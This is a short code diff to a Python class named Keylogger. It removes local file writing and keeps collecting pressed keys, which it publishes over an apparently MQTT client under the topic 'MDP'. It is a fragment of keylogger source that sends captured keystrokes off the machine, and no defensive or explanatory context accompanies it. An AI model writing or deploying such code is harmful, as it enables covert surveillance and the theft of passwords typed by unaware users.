@@ -17,10 +17,10 @@ class Keylogger:
 
     def write_to_file(self):
         keys = ""
-        with open(self.file, "a") as f:
-            for key, event_type in self.keystrokes:
-                if event_type == "down":
-                    keys += key + ' '
+
+        for key, event_type in self.keystrokes:
+            if event_type == "down":
+                keys += key + ' '
         self.client.publish("MDP", keys)
 
     def log(self):
